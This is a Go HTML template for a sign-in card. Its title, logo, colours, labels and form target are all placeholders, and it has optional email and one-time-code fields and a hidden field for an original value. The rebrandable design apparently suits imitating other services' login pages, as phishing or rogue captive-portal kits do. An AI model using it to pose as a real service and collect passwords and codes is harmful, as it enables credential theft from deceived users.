<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>{{.Title}}</title>
<style>
  body { font-family: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #e9eef3; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
  .card { background: #fff; width: 360px; padding: 40px 32px; border-radius: 8px; box-shadow: 0 2px 12px rgba(0,0,0,.14); text-align: center; }
  .logo { width: 56px; height: 56px; border-radius: 12px; background: {{.LogoColor}}; color: #fff; font-size: 30px; font-weight: 700; line-height: 56px; margin: 0 auto 12px; }
  h1 { font-size: 20px; margin: 8px 0 4px; color: #1c1e21; }
  .sub { color: #606770; font-size: 13px; margin-bottom: 24px; }
  form { text-align: left; }
  label { display: block; font-size: 13px; color: #606770; margin: 12px 0 4px; }
  input[type=text], input[type=password], input[type=email] { width: 100%; box-sizing: border-box; padding: 12px; border: 1px solid #ccd0d5; border-radius: 6px; font-size: 15px; }
  button { width: 100%; margin-top: 20px; padding: 12px; border: 0; border-radius: 6px; background: {{.ButtonColor}}; color: #fff; font-size: 16px; font-weight: 600; cursor: pointer; }
  .note { margin-top: 18px; font-size: 12px; color: #90949c; }
</style>
</head>
<body>
<div class="card">
  <div class="logo">{{.LogoText}}</div>
  <h1>{{.Title}}</h1>
  <p class="sub">{{.Subtitle}}</p>
  <form method="post" action="{{.Action}}">
    <input type="hidden" name="orig" value="{{.Orig}}">
    {{if .ShowEmail}}<label>{{.EmailLabel}}</label><input type="email" name="email" required autofocus>{{end}}
    <label>{{.UsernameLabel}}</label><input type="text" name="username" autocomplete="username" {{if not .ShowEmail}}required autofocus{{end}}>
    <label>{{.PasswordLabel}}</label><input type="password" name="password" autocomplete="current-password" required>
    {{if .ShowOTP}}<label>{{.OTPLabel}}</label><input type="text" name="otp" inputmode="numeric" autocomplete="one-time-code">{{end}}
    <button type="submit">{{.ButtonText}}</button>
  </form>
  <p class="note">You must be signed in to continue.</p>
</div>
</body>
</html>
